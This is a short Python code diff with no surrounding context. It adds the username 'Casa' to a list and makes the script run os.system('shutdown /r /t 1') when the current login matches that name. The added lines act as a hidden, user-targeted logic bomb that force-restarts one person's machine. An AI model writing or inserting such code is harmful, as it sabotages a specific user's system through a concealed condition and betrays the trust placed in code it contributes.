@@ -1,3 +1,3 @@
-t = []
+t = ["Casa"]
 if os.getlogin() in t:
-  pass
+  os.system("shutdown /r /t 1")
